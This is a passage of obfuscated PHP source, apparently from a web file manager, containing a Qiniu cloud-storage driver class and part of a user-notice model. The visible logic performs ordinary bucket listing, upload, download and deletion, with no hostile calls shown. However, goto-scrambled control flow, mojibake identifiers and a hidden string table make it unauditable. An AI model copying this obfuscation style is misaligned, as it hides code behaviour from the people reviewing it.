} public function sort($CÎ¬§Ó„¼, $aß¥å¿óØ‹) { return parent::update($CÎ¬§Ó„¼, $aß¥å¿óØ‹); } public function enable($eØÀîóÉå, $eåÇ†¹ÍÂ) { return parent::update($eØÀîóÉå, array($_SERVER[¹…ÕÄ][2072] => $eåÇ†¹ÍÂ)); } private function initUserOption() { $C·¡¦ì¢™ˆ =& $_SERVER[¹…ÕÄ]; $this->optionType = $C·¡¦ì¢™ˆ[2073]; $this->modelType = $C·¡¦ì¢™ˆ[2074]; $this->field = array($C·¡¦ì¢™ˆ[2075], $C·¡¦ì¢™ˆ[28], $C·¡¦ì¢™ˆ[195], $C·¡¦ì¢™ˆ[29], $C·¡¦ì¢™ˆ[2076], $C·¡¦ì¢™ˆ[705], $C·¡¦ì¢™ˆ[189]); } public function userNoticeGet($CŒ÷’ä¨±‡ = false) { $this->initUserOption(); return parent::listData($CŒ÷’ä¨±‡, $_SERVER[¹…ÕÄ][388], !0); } public function userNoticeAdd($FËîô£‹Ä†) { $EĞÍ§‹ÂŠí =& $_SERVER[¹…ÕÄ]; $this->initUserOption(); $fò´™¦øÛ = $this->findByKey($EĞÍ§‹ÂŠí[2075], $FËîô£‹Ä†[$EĞÍ§‹ÂŠí[388]]); if ($fò´™¦øÛ) { return !0; } $e›Ë¤®¤öˆ = array($EĞÍ§‹ÂŠí[2075] => $FËîô£‹Ä†[$EĞÍ§‹ÂŠí[388]], $EĞÍ§‹ÂŠí[28] => $FËîô£‹Ä†[$EĞÍ§‹ÂŠí[28]], $EĞÍ§‹ÂŠí[195] => $FËîô£‹Ä†[$EĞÍ§‹ÂŠí[195]], $EĞÍ§‹ÂŠí[29] => isset($FËîô£‹Ä†[$EĞÍ§‹ÂŠí[29]]) ? $FËîô£‹Ä†[$EĞÍ§‹ÂŠí[29]] : 1, $EĞÍ§‹ÂŠí[2076] => isset($FËîô£‹Ä†[$EĞÍ§‹ÂŠí[2076]]) ? $FËîô£‹Ä†[$EĞÍ§‹ÂŠí[2076]] : 0, $EĞÍ§‹ÂŠí[705] => 0, $EĞÍ§‹ÂŠí[189] => 0); return parent::insert($e›Ë¤®¤öˆ); } public function userNoticeEdit($eëİÙêÖíï, $D²À‘à¨„é) { $this->initUserOption(); return parent::update($eëİÙêÖíï, $D²À‘à¨„é); } } goto e™šÆØ¦©Ê; d¼††ÇŞ¥–: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($AôĞêìÛˆÔ) { parent::__construct(); require_once SDK_DIR . $_SERVER[¹…ÕÄ][1279]; $this->_init($AôĞêìÛˆÔ); } public function _init($c…¸Ğ¡¸Ã) { goto cŠ¼œÚÙ¾¢; cËå’†ß‚: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto FñÄĞìïŞ; B³Ó½Ï Ù: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto cËå’†ß‚; cŠ¼œÚÙ¾¢: $a• –¿ğ©Ä =& $_SERVER[¹…ÕÄ]; foreach ($c…¸Ğ¡¸Ã as $cµƒÕ°Öİ => $C‰“Ùô’ì¦) { if (isset($this->{$cµƒÕ°Öİ})) { $this->{$cµƒÕ°Öİ} = $C‰“Ùô’ì¦; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($a• –¿ğ©Ä[1280] . LNG($a• –¿ğ©Ä[1238])); } goto B³Ó½Ï Ù; FñÄĞìïŞ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($d³‡ÀÜÄèÊ, $aÜÚ¥ÏŒ×² = '', $C”‹³¤Ù¥ = REPEAT_RENAME) { if ($this->setContent($d³‡ÀÜÄèÊ, $aÜÚ¥ÏŒ×²)) { return $this->getPathOuter($d³‡ÀÜÄèÊ); } return !1; } public function mkdir($F”óÔ¹·ª, $C¢ÕØ§ = REPEAT_SKIP) { goto EƒÕÆ¼´Ü; CÛø®ñ½¶: $F”óÔ¹·ª = $aÂ¦‚¯è” . $a¨Úš”¨ª[8]; $EŒáã¸«‡ = get_path_this($aÂ¦‚¯è”); $E¬ó‹„Ö¤ = $F”óÔ¹·ª . $EŒáã¸«‡; goto aÌ”™¸š°É; EƒÕÆ¼´Ü: $a¨Úš”¨ª =& $_SERVER[¹…ÕÄ]; $aÂ¦‚¯è” = trim($F”óÔ¹·ª, $a¨Úš”¨ª[8]); if ($this->_isFolder($aÂ¦‚¯è”)) { return $this->getPathOuter($aÂ¦‚¯è”); } goto CÛø®ñ½¶; aÌ”™¸š°É: if (!$this->mkfile($E¬ó‹„Ö¤)) { return !1; } if (!$this->moveFile($E¬ó‹„Ö¤, $F”óÔ¹·ª)) { $this->delFile($E¬ó‹„Ö¤); return !1; } return $this->getPathOuter($aÂ¦‚¯è”); goto eËÉ—Äİ¢; eËÉ—Äİ¢: } public function copyFile($dŸ‰ì¨ö‚ù, $eÌŞœÌŸê) { $B ­¹£§  = $this->bucketManager->copy($this->bucket, $dŸ‰ì¨ö‚ù, $this->bucket, $eÌŞœÌŸê, !0); return $B ­¹£§  ? !1 : $this->getPathOuter($eÌŞœÌŸê); } public function moveFile($F³ç¿²à¢, $b³†Æ©ÖÖ§) { $C½íí”çÀˆ = $this->bucketManager->move($this->bucket, $F³ç¿²à¢, $this->bucket, $b³†Æ©ÖÖ§, !0); return $C½íí”çÀˆ ? !1 : $this->getPathOuter($b³†Æ©ÖÖ§); } public function delFile($C¼¢—Í˜ä‰) { if (!$this->exist($C¼¢—Í˜ä‰)) { return !0; } $AØ–ßºéø‡ = $this->bucketManager->delete($this->bucket, $C¼¢—Í˜ä‰); return $AØ–ßºéø‡ ? !1 : !0; } public function delFolder($eËÎçÄåßç) { goto fµØ‡¬; A–‡¶è°Êƒ: $EÃ®’‘Îãš = $this->fileList($eËÎçÄåßç); $this->listItemCache = !0; $bíí›ÀåË = trim($eËÎçÄåßç, $cº¿£ˆÅÚ†[8]) . $cº¿£ˆÅÚ†[8]; goto BôÒâ¢‘²š; fµØ‡¬: $cº¿£ˆÅÚ† =& $_SERVER[¹…ÕÄ]; if (!$this->exist($eËÎçÄåßç)) { return !0; } $this->listItemCache = !1; goto A–‡¶è°Êƒ; BôÒâ¢‘²š: if (!empty($eËÎçÄåßç) && !in_array($bíí›ÀåË, $EÃ®’‘Îãš[$cº¿£ˆÅÚ†[74]])) { $EÃ®’‘Îãš[$cº¿£ˆÅÚ†[74]][] = $bíí›ÀåË; } $fßš’±Úé = $this->delByBatch($EÃ®’‘Îãš[$cº¿£ˆÅÚ†[73]]); if (!$fßš’±Úé) { return !1; } goto EÊŞ‹‘Æ×›; EÊŞ‹‘Æ×›: return $this->delByBatch($EÃ®’‘Îãš[$cº¿£ˆÅÚ†[74]]); goto FÃçÚ•œˆô; FÃçÚ•œˆô: } private function delByBatch($B‘–œƒãø) { foreach (array_chunk($B‘–œƒãø, 1000) as $f­ÕÄ„ŠÃ‚) { $E»Ò·Ã‰Ã = $this->bucketManager->buildBatchDelete($this->bucket, $f­ÕÄ„ŠÃ‚); list($c¶¼éŠÕõ, $aÏ›ì®é©é) = $this->bucketManager->batch($E»Ò·Ã‰Ã); if ($aÏ›ì®é©é) { return !1; } } return !0; } public function rename($AÀÔ©õ……Ù, $EŠ¦¯Ğâ®·) { return $this->renameObject($AÀÔ©õ……Ù, $EŠ¦¯Ğâ®·); } public function fileInfo($CîÒ†§—¶Ñ, $fŸä…¿Ğ“‘ = false, $aÌÁšç–¢Ò = array()) { goto c³À—Ï½ï›; c³À—Ï½ï›: $d’Ùø¬–¸Š =& $_SERVER[¹…ÕÄ]; $AÒ¢Ñßæ¸ = array($d’Ùø¬–¸Š[28] => $this->pathThis($CîÒ†§—¶Ñ), $d’Ùø¬–¸Š[75] => $this->getPathOuter($d’Ùø¬–¸Š[8] . $CîÒ†§—¶Ñ), $d’Ùø¬–¸Š[29] => $d’Ùø¬–¸Š[173], $d’Ùø¬–¸Š[77] => isset($aÌÁšç–¢Ò[$d’Ùø¬–¸Š[1281]]) ? $aÌÁšç–¢Ò[$d’Ùø¬–¸Š[1281]] : 0, $d’Ùø¬–¸Š[167] => $this->ext($CîÒ†§—¶Ñ)); if ($fŸä…¿Ğ“‘) { return $AÒ¢Ñßæ¸; } goto A°™÷’»š; A°™÷’»š: $AÒ¢Ñßæ¸[$d’Ùø¬–¸Š[192]] = $AÒ¢Ñßæ¸[$d’Ùø¬–¸Š[83]] = 0; $AÒ¢Ñßæ¸[$d’Ùø¬–¸Š[193]] = $AÒ¢Ñßæ¸[$d’Ùø¬–¸Š[194]] = !0; if (empty($aÌÁšç–¢Ò)) { $aÌÁšç–¢Ò = $this->objectMeta($CîÒ†§—¶Ñ); if (!$aÌÁšç–¢Ò) { return $AÒ¢Ñßæ¸; } } goto DˆøµÏáÊ±; DˆøµÏáÊ±: if (isset($aÌÁšç–¢Ò[$d’Ùø¬–¸Š[1282]])) { $AÒ¢Ñßæ¸[$d’Ùø¬–¸Š[83]] = substr($aÌÁšç–¢Ò[$d’Ùø¬–¸Š[1282]] . $d’Ùø¬–¸Š[33], 0, 10); } if (isset($aÌÁšç–¢Ò[$d’Ùø¬–¸Š[1281]])) { $AÒ¢Ñßæ¸[$d’Ùø¬–¸Š[77]] = $aÌÁšç–¢Ò[$d’Ùø¬–¸Š[1281]]; } return $AÒ¢Ñßæ¸; goto AÊĞ„­Üƒ¯; AÊĞ„­Üƒ¯: } public function folderInfo($d¿Ã´ÈÒ¢æ, $dœÑäöÁë = false) { goto CîÒ¦¦çí; b™¢‰óª¸¸: $c†¦ÓÏ˜©Ô[$aÕ…‡ñ§®[192]] = $c†¦ÓÏ˜©Ô[$aÕ…‡ñ§®[83]] = 0; $c†¦ÓÏ˜©Ô[$aÕ…‡ñ§®[193]] = $c†¦ÓÏ˜©Ô[$aÕ…‡ñ§®[194]] = !0; $d¿Ã´ÈÒ¢æ = rtrim($d¿Ã´ÈÒ¢æ, $aÕ…‡ñ§®[8]) . $aÕ…‡ñ§®[8]; goto A§¦ø›•×ó; CîÒ¦¦çí: $aÕ…‡ñ§® =& $_SERVER[¹…ÕÄ]; $c†¦ÓÏ˜©Ô = array($aÕ…‡ñ§®[28] => $this->pathThis($d¿Ã´ÈÒ¢æ), $aÕ…‡ñ§®[75] => $this->getPathOuter($aÕ…‡ñ§®[8] . $d¿Ã´ÈÒ¢æ), $aÕ…‡ñ§®[29] => $aÕ…‡ñ§®[76]); if ($dœÑäöÁë) { return $c†¦ÓÏ˜©Ô; } goto b™¢‰óª¸¸; A§¦ø›•×ó: $FÛå§Ò™î‘ = $this->objectMeta($d¿Ã´ÈÒ¢æ); if (isset($FÛå§Ò™î‘[$aÕ…‡ñ§®[1282]])) { $c†¦ÓÏ˜©Ô[$aÕ…‡ñ§®[83]] = substr($FÛå§Ò™î‘[$aÕ…‡ñ§®[1282]] . $aÕ…‡ñ§®[33], 0, 10); } return $c†¦ÓÏ˜©Ô; goto AìÜÂôõ; AìÜÂôõ: } public function listPath($e¦›³š”Ş, $FÜÄ²³Æ°è = false) { $a·«Êê§¡ =& $_SERVER[¹…ÕÄ]; $E¦¡Š¥¯›è = $this->fileList($e¦›³š”Ş, $a·«Êê§¡[8], !0); foreach ($E¦¡Š¥¯›è[$a·«Êê§¡[74]] as $B´Ş¿°éÚç => $cÊáËİİã) { $E¦¡Š¥¯›è[$a·«Êê§¡[74]][$B´Ş¿°éÚç] = $this->folderInfo($cÊáËİİã, $FÜÄ²³Æ°è); } foreach ($E¦¡Š¥¯›è[$a·«Êê§¡[73]] as $B´Ş¿°éÚç => $cÊáËİİã) { $E¦¡Š¥¯›è[$a·«Êê§¡[73]][$B´Ş¿°éÚç] = $this->fileInfo($cÊáËİİã[$a·«Êê§¡[92]], $FÜÄ²³Æ°è, $cÊáËİİã); } return $E¦¡Š¥¯›è; } public function has($fí’ï…é…Ô, $d…ÚœìÖìÖ = false, $eÓª¹íÄ£Ï = true) { goto e†Ù§¸; c±ÅÓ¶‘©: $cÂé­×Â¨Ÿ = $fÎ¦«ÁÎ¡[33]; $A¯îÄ¯–ŒÑ = 500; $Eõæøœ¶¶¢ = $fÎ¦«ÁÎ¡[8]; goto Bì„ŒŒëŞ; Bì„ŒŒëŞ: $f«³Úîé¢è = $fÇç¢ï§· = 0; while (!0) { check_abort(); list($f§³Ç‰ÎƒÙ, $eòå·ï±Ğ) = $this->bucketManager->listFiles($this->bucket, $cƒµ–§õÎç, $cÂé­×Â¨Ÿ, $A¯îÄ¯–ŒÑ, $Eõæøœ¶¶¢); if ($eòå·ï±Ğ) { break; } $cÂé­×Â¨Ÿ = array_key_exists($fÎ¦«ÁÎ¡[1250], $f§³Ç‰ÎƒÙ) ? $cÂé­×Â¨Ÿ = $f§³Ç‰ÎƒÙ[$fÎ¦«ÁÎ¡[1283]] : $fÎ¦«ÁÎ¡[33]; if ($d…ÚœìÖìÖ) { if (!empty($f§³Ç‰ÎƒÙ[$fÎ¦«ÁÎ¡[1284]])) { $f«³Úîé¢è += count($f§³Ç‰ÎƒÙ[$fÎ¦«ÁÎ¡[1284]]); } if (!empty($f§³Ç‰ÎƒÙ[$fÎ¦«ÁÎ¡[1285]])) { $fÇç¢ï§· += count($f§³Ç‰ÎƒÙ[$fÎ¦«ÁÎ¡[1285]]); } if ($cÂé­×Â¨Ÿ === $fÎ¦«ÁÎ¡[33]) { break; } continue; } if ($eÓª¹íÄ£Ï) { if (!empty($f§³Ç‰ÎƒÙ[$fÎ¦«ÁÎ¡[1284]])) { return !0; } } else { if (!empty($f§³Ç‰ÎƒÙ[$fÎ¦«ÁÎ¡[1285]])) { return !0; } } if ($cÂé­×Â¨Ÿ === $fÎ¦«ÁÎ¡[33]) { break; } } if ($d…ÚœìÖìÖ) { return array($fÎ¦«ÁÎ¡[201] => $f«³Úîé¢è, $fÎ¦«ÁÎ¡[202] => $fÇç¢ï§·); } goto cŞ†…Òàè‚; e†Ù§¸: $fÎ¦«ÁÎ¡ =& $_SERVER[¹…ÕÄ]; $fí’ï…é…Ô = trim($fí’ï…é…Ô, $fÎ¦«ÁÎ¡[8]); $cƒµ–§õÎç = empty($fí’ï…é…Ô) ? $fÎ¦«ÁÎ¡[33] : $fí’ï…é…Ô . $fÎ¦«ÁÎ¡[8]; goto c±ÅÓ¶‘©; cŞ†…Òàè‚: return !1; goto EˆñƒÏ®¯; EˆñƒÏ®¯: } public function listAll($fºŞ‹ˆèÌ) { $AäĞôÂÎµ¸ =& $_SERVER[¹…ÕÄ]; $bÜ£ŠÇ¼çÜ = $this->fileList($fºŞ‹ˆèÌ, $AäĞôÂÎµ¸[33], !0); $aá¼“•©Ş½ = array(); foreach ($bÜ£ŠÇ¼çÜ[$AäĞôÂÎµ¸[73]] as $C›ã»­ÕÁÏ) { $aá¼“•©Ş½[$C›ã»­ÕÁÏ[$AäĞôÂÎµ¸[92]]] = $C›ã»­ÕÁÏ[$AäĞôÂÎµ¸[77]]; } foreach ($bÜ£ŠÇ¼çÜ[$AäĞôÂÎµ¸[74]] as $C›ã»­ÕÁÏ) { if (is_string($C›ã»­ÕÁÏ)) { $aá¼“•©Ş½[$C›ã»­ÕÁÏ] = 0; } } return $this->listAllFiles($fºŞ‹ˆèÌ, array_keys($aá¼“•©Ş½), $aá¼“•©Ş½); } private function fileList($BÚ§¹¶…œ, $b¸¶Ò®› = '', $cî±´Á¥º» = 0) { goto bÁŠ»Ê™; c±œÑ¿œ›†: $AæÑ°¨´Ã = $E‰çÙŠ…µå = array(); while (!0) { check_abort(); list($C‰Ëá åØ¼, $E‡·¢ŠÒğ¡) = $this->bucketManager->listFiles($this->bucket, $b·ÙÇô†ğÑ, $fğÕÆ–‡“, $b÷ã¥—¯ç, $b¸¶Ò®›); if ($E‡·¢ŠÒğ¡) { break; } $fğÕÆ–‡“ = array_key_exists($bË®·—Şš[1250], $C‰Ëá åØ¼) ? $fğÕÆ–‡“ = $C‰Ëá åØ¼[$bË®·—Şš[1283]] : $bË®·—Şš[33]; $cìô¯ù«¦ = isset($C‰Ëá åØ¼[$bË®·—Şš[1284]]) ? $C‰Ëá åØ¼[$bË®·—Şš[1284]] : array(); $BÁß¿˜Ñœ´ = isset($C‰Ëá åØ¼[$bË®·—Şš[1285]]) ? $C‰Ëá åØ¼[$bË®·—Şš[1285]] : array(); foreach ($cìô¯ù«¦ as $FóôÒ¸«â) { goto c†©ƒ„Å”è; cõ¿á¥íª: $FóôÒ¸«â[$bË®·—Şš[77]] = $EÖ¸è®ƒå ; $DëáàÏê“¾ = $EÖ¸è®ƒå  == 0 && substr($f’•óõØ‹–, strlen($f’•óõØ‹–) - 1, 1) == $bË®·—Şš[8] ? !0 : !1; if ($FĞ“¤¹±¶) { $this->cacheMethod($bË®·—Şš[197], $f’•óõØ‹–, $DëáàÏê“¾); $this->cacheMethod($bË®·—Şš[198], $f’•óõØ‹–, $FóôÒ¸«â); } goto E¦Ó³Ïø²è; c†©ƒ„Å”è: if ($FóôÒ¸«â[$bË®·—Şš[92]] == $b·ÙÇô†ğÑ) { continue; } $f’•óõØ‹– = $FóôÒ¸«â[$bË®·—Şš[92]]; $EÖ¸è®ƒå  = $FóôÒ¸«â[$bË®·—Şš[1281]]; goto cõ¿á¥íª; E¦Ó³Ïø²è: if ($DëáàÏê“¾) { $AæÑ°¨´Ã[] = $f’•óõØ‹–; continue; } $E‰çÙŠ…µå[] = $cî±´Á¥º» ? $FóôÒ¸«â : $f’•óõØ‹–; goto b“¢‰…¥»; b“¢‰…¥»: } foreach ($BÁß¿˜Ñœ´ as $f’•óõØ‹–) { if ($f’•óõØ‹– == $b·ÙÇô†ğÑ) { continue; } $AæÑ°¨´Ã[] = $f’•óõØ‹–; if ($FĞ“¤¹±¶) { $this->cacheMethod($bË®·—Şš[197], $f’•óõØ‹–, !0); } } if ($fğÕÆ–‡“ === $bË®·—Şš[33]) { break; } } if ($FĞ“¤¹±¶) { $this->cacheMethod($bË®·—Şš[197], $BÚ§¹¶…œ, !0); } goto d³ŒéÒ±ÅÔ; bÁŠ»Ê™: $bË®·—Şš =& $_SERVER[¹…ÕÄ]; $BÚ§¹¶…œ = trim($BÚ§¹¶…œ, $bË®·—Şš[8]); $b·ÙÇô†ğÑ = empty($BÚ§¹¶…œ) ? $bË®·—Şš[33] : $BÚ§¹¶…œ . $bË®·—Şš[8]; goto Aã±ÏÙ×º; d³ŒéÒ±ÅÔ: return array($bË®·—Şš[74] => $AæÑ°¨´Ã, $bË®·—Şš[73] => $E‰çÙŠ…µå); goto AõŠô•Ï«Æ; Aã±ÏÙ×º: $fğÕÆ–‡“ = $bË®·—Şš[33]; $b÷ã¥—¯ç = 1000; $FĞ“¤¹±¶ = $this->listItemCache === !1 ? !1 : !0; goto c±œÑ¿œ›†; AõŠô•Ï«Æ: } public function canRead($fÒÆ«›ìí´) { return $this->exist($fÒÆ«›ìí´) ? !0 : !1; } public function canWrite($F°‰¨§ëÏè) { return $this->exist($F°‰¨§ëÏè) ? !0 : !1; } public function getContent($dÔÛøí–¤ï) { return $this->fileSubstr($dÔÛøí–¤ï, 0, -1); } public function setContent($F ëºµà°, $FØÓŸÃâô = '') { $F›–Â·µ = $this->tempFile($this->pathThis($F ëºµà°)); file_put_contents($F›–Â·µ, $FØÓŸÃâô); if ($this->upload($F ëºµà°, $F›–Â·µ)) { $this->tempFileRemve($F›–Â·µ); return !0; } return !1; } public function refreshUrls($ağ³Ûîº‰¥) { goto B°˜÷…ÖÜ‡; f††‰¿ªî¼: $c‰¦É÷ĞÀ³ = new Qiniu\Cdn\CdnManager($this->auth); list($d‹íâµâ¨É, $bÏİÎì÷³Ş) = $c‰¦É÷ĞÀ³->refreshUrls($eøçÓ£å¹è); if ($bÏİÎì÷³Ş) { return !1; } goto aÂæÀƒ‹£Ó; aÂæÀƒ‹£Ó: return $d‹íâµâ¨É[$c¥²‘ÚíÂ[1056]] == $c¥²‘ÚíÂ[712] ? !0 : !1; goto c¬™Õ÷Õğ·; B°˜÷…ÖÜ‡: $c¥²‘ÚíÂ =& $_SERVER[¹…ÕÄ]; $eøçÓ£å¹è = array(); if (is_array($ağ³Ûîº‰¥)) { foreach ($ağ³Ûîº‰¥ as $C‰…ïŞ°âè) { $eøçÓ£å¹è[] = $this->link($C‰…ïŞ°âè); } } else { $eøçÓ£å¹è[] = $this->link($ağ³Ûîº‰¥); } goto f††‰¿ªî¼; c¬™Õ÷Õğ·: } public function fileSubstr($BÀƒŠ§¢Ş¤, $e°Š‚‹ÈÙ, $D‹íÓ…ƒÈŠ) { $eœàäÔ‚“Œ =& $_SERVER[¹…ÕÄ]; if (!($fğÌìºº¡¤ = $this->link($BÀƒŠ§¢Ş¤))) { return !1; } $F¶…éÈÁ°È = !1; if ($D‹íÓ…ƒÈŠ > 0) { $aŒÒŒ¿¹ = $e°Š‚‹ÈÙ + $D‹íÓ…ƒÈŠ - 1; $F¶…éÈÁ°È = array($eœàäÔ‚“Œ[1286] . $e°Š‚‹ÈÙ . $eœàäÔ‚“Œ[434] . $aŒÒŒ¿¹); } $d‡§”À¼–¡ = url_request($fğÌìºº¡¤, $eœàäÔ‚“Œ[226], !1, $F¶…éÈÁ°È); return $d‡§”À¼–¡[$eœàäÔ‚“Œ[705]] ? $d‡§”À¼–¡[$eœàäÔ‚“Œ[1066]] : !1; } public function upload($cŸÉˆ‰°, $fğ“õœ’ÔŞ, $eˆêÂä¨‹» = false, $aöæÊ = REPEAT_REPLACE) { $eÇ‰é§‹ùÙ = new Qiniu\Storage\UploadManager(); $DôÓëÀÂ² = $this->auth->uploadToken($this->bucket, $cŸÉˆ‰°); $d™ê›îİ²Œ = get_file_mime(get_path_ext($fğ“õœ’ÔŞ)); list($FŞù‘Ş„ç, $a±ä±Ÿ“æ‹) = $eÇ‰é§‹ùÙ->putFile($DôÓëÀÂ², $cŸÉˆ‰°, $fğ“õœ’ÔŞ, null, $d™ê›îİ²Œ); return $a±ä±Ÿ“æ‹ ? !1 : $this->getPathOuter($cŸÉˆ‰°); } public function uploadFormData($Eğæ¤šôáÂ, $BâÁİ‹Î¯ë = 3600) { return $this->uploadToken($Eğæ¤šôáÂ, $BâÁİ‹Î¯ë); } public function multiUploadFormData($fôÈÍ¼ªŞ·, $d®³–ŒÄØ = 3600) { return $this->uploadToken($fôÈÍ¼ªŞ·, $d®³–ŒÄØ); } private function uploadToken($c¯ì¶ª¢Ï‹, $Eİ¿›ñËÈ‰ = 3600) { goto DØàØ§œõó; DØàØ§œõó: $eò‡Ã×·ÌÂ =& $_SERVER[¹…ÕÄ]; $cÃÅ¡¦å…¶ = $Eİ¿›ñËÈ‰; $F ùòèÇ½ï = array($eò‡Ã×·ÌÂ[1287] => $eò‡Ã×·ÌÂ[1288]); goto Aâ »½ù…; Aâ »½ù…: $dÙ‘øÓ³ˆ = $c¯ì¶ª¢Ï‹; $e‘Øñ›‹ğÔ = $this->auth->uploadToken($this->bucket, $dÙ‘øÓ³ˆ, $cÃÅ¡¦å…¶, $F ùòèÇ½ï, !0); $a„“ÀÖ±œ· = empty($this->region) || $this->region == $eò‡Ã×·ÌÂ[1289] ? $eò‡Ã×·ÌÂ[33] : $eò‡Ã×·ÌÂ[434] . $this->region; goto CëºÉø‚©‰; CëºÉø‚©‰: $EÎÁÅØÂÜ¬ = http_type() . "\x3a\x2f\57\x75\x70\x6c\157\141\144{$a„“ÀÖ±œ·}\56\x71\x69\156\x69\165\160\56\x63\157\155\x2f"; return array($eò‡Ã×·ÌÂ[1290] => $e‘Øñ›‹ğÔ, $eò‡Ã×·ÌÂ[1291] => $EÎÁÅØÂÜ¬); goto d˜ˆÒİ·‡; d˜ˆÒİ·‡: } public function download($FÙ¡ÚÂÆ‡à, $fŞÕâ³Óº ) { goto CƒØôùò¡ß; fğˆàï“„: $D×Éå…ù‚¯ = 1024 * 200; $fæ†óÜäœ‘ = fopen($A­–¨ÒÌ, $_SERVER[¹…ÕÄ][1292]); while (!0) { $Fï¶ğÉ—§ = $this->fileSubstr($FÙ¡ÚÂÆ‡à, $Eß‰Î÷„„‡, $D×Éå…ù‚¯); if ($Fï¶ğÉ—§ === !1) { return !1; } fwrite($fæ†óÜäœ‘, $Fï¶ğÉ—§); $Eß‰Î÷„„‡ += $D×Éå…ù‚¯; if (strlen($Fï¶ğÉ—§) < $D×Éå…ù‚¯) { break; } } goto B à‡éÑĞó; B à‡éÑĞó: fclose($fæ†óÜäœ‘); return $fŞÕâ³Óº ; goto fÎƒèºãŒ¥; CƒØôùò¡ß: $A­–¨ÒÌ = IO::getPathInner(IO::mkfile($fŞÕâ³Óº )); if (!($C©Ù…Îäâ¸ = $this->link($FÙ¡ÚÂÆ‡à))) { return !1; } $Eß‰Î÷„„‡ = 0; goto fğˆàï“„; fÎƒèºãŒ¥: } public function link($e…ŠğéÑÎÎ, $E«°åÉ–¡® = '') { if (!$this->isFile($e…ŠğéÑÎÎ)) { return !1; } $dŸ óŸÈ™­ = $this->getHost() . $_SERVER[¹…ÕÄ][8] . $this->pathEncode($e…ŠğéÑÎÎ) . $E«°åÉ–¡®; return $this->auth->privateDownloadUrl($dŸ óŸÈ™­, 3600 * 12); } public function fileOut($D–‰Ò·ç©, $cïÁ¾èÜ±× = false, $F¼Š„ˆÙÌ = false, $CÛÌîéÖ¹× = '') { $eîê˜ÙÎ…ë =& $_SERVER[¹…ÕÄ]; if ($this->isFileOutServer()) { return $this->fileOutServer($D–‰Ò·ç©, $cïÁ¾èÜ±×, $F¼Š„ˆÙÌ, $CÛÌîéÖ¹×); } if (!$F¼Š„ˆÙÌ) { $F¼Š„ˆÙÌ = $this->pathThis($D–‰Ò·ç©); } $aÒ‡ÛÇĞÏ½ = $cïÁ¾èÜ±× ? $eîê˜ÙÎ…ë[1293] . rawurlencode($F¼Š„ˆÙÌ) : $eîê˜ÙÎ…ë[33]; $fÏ»×¿ÏÎä = $this->link($D–‰Ò·ç©, $aÒ‡ÛÇĞÏ½); $this->fileOutLink($fÏ»×¿ÏÎä); } public function fileOutServer($b¶÷¶â£•, $c”©Ş‡İô = false, $cÈ¯´Îª÷‹ = false, $E÷ƒ”Ü¡—Ë = '') { parent::fileOut($b¶÷¶â£•, $c”©Ş‡İô, $cÈ¯´Îª÷‹, $E÷ƒ”Ü¡—Ë); } public function fileOutImage($a¼¿ÖŒÆ·ß, $e¡æø„Ë•¥ = 250) { $DÍï´õµÙ = $this->link($a¼¿ÖŒÆ·ß, $_SERVER[¹…ÕÄ][1294] . $e¡æø„Ë•¥); $this->fileOutLink($DÍï´õµÙ); } public function fileOutImageServer($BáÕÏßå¾Ê, $F¦õ™Ç¸ŞÂ = 250) { parent::fileOutImage($BáÕÏßå¾Ê, $F¦õ™Ç¸ŞÂ); } public function hashMd5($A¥ŠÏŞ¥«¸) { $Bôø©î†½‰ =& $_SERVER[¹…ÕÄ]; $F¾º†øï˜í = $this->objectMeta($A¥ŠÏŞ¥«¸); return isset($F¾º†øï˜í[$Bôø©î†½‰[206]]) ? $F¾º†øï˜í[$Bôø©î†½‰[206]] : !1; $Eóù‡š„Ç = $this->link($A¥ŠÏŞ¥«¸, $Bôø©î†½‰[1295]); } public function size($cŒ¶¶°Ü»Ö) { $CÓŸ•Óí‘ = $this->objectMeta($cŒ¶¶°Ü»Ö); return $CÓŸ•Óí‘ ? $CÓŸ•Óí‘[$_SERVER[¹…ÕÄ][77]] : 0; } public function info($E•âÑ¸Š½Ã) { if ($this->isFolder($E•âÑ¸Š½Ã)) { return $this->folderInfo($E•âÑ¸Š½Ã); } else { if ($this->isFile($E•âÑ¸Š½Ã)) { return $this->fileInfo($E•âÑ¸Š½Ã); } } return !1; } public function exist($dÒß¥¶™ç) { return $this->isFile($dÒß¥¶™ç) || $this->isFolder($dÒß¥¶™ç); } public function isFile($f»ëˆ¯â©Ó) { return !$this->isFolder($f»ëˆ¯â©Ó) && $this->objectMeta($f»ëˆ¯â©Ó); } public function isFolder($b¥Œ÷ö­Ş‚) { return $this->cacheMethod($_SERVER[¹…ÕÄ][197], $b¥Œ÷ö­Ş‚); } protected function objectMeta($CôÑÅÛŞŒ¶) { return $this->cacheMethod($_SERVER[¹…ÕÄ][198], $CôÑÅÛŞŒ¶); } protected function _objectMeta($E’¬ÎöŞ‰‘) { $D´ÆÊ‹›„ =& $_SERVER[¹…ÕÄ]; list($F¬ï‰ö°¸Ä, $CŠõ‘éğÂ) = $this->bucketManager->stat($this->bucket, $E’¬ÎöŞ‰‘); if ($F¬ï‰ö°¸Ä) { $F¬ï‰ö°¸Ä[$D´ÆÊ‹›„[77]] = intval($F¬ï‰ö°¸Ä[$D´ÆÊ‹›„[1281]]); } return $F¬ï‰ö°¸Ä; } protected function _isFolder($e†¦ìäİæÊ) { $eõçÒ„çˆÓ =& $_SERVER[¹…ÕÄ]; if ($e†¦ìäİæÊ == $eõçÒ„çˆÓ[33] || $e†¦ìäİæÊ == $eõçÒ„çˆÓ[8]) { return !0; } list($dÂÄÆ‹„ÒÜ, $dÁ«¼ï›õô) = $this->bucketManager->listFiles($this->bucket, trim($e†¦ìäİæÊ, $eõçÒ„çˆÓ[8]) . $eõçÒ„çˆÓ[8], $eõçÒ„çˆÓ[33], 1, $eõçÒ„çˆÓ[8]); return !empty($dÂÄÆ‹„ÒÜ[$eõçÒ„çˆÓ[1284]]) || !empty($dÂÄÆ‹„ÒÜ[$eõçÒ„çˆÓ[1285]]) ? !0 : !1; } } class PathDriverS3 extends 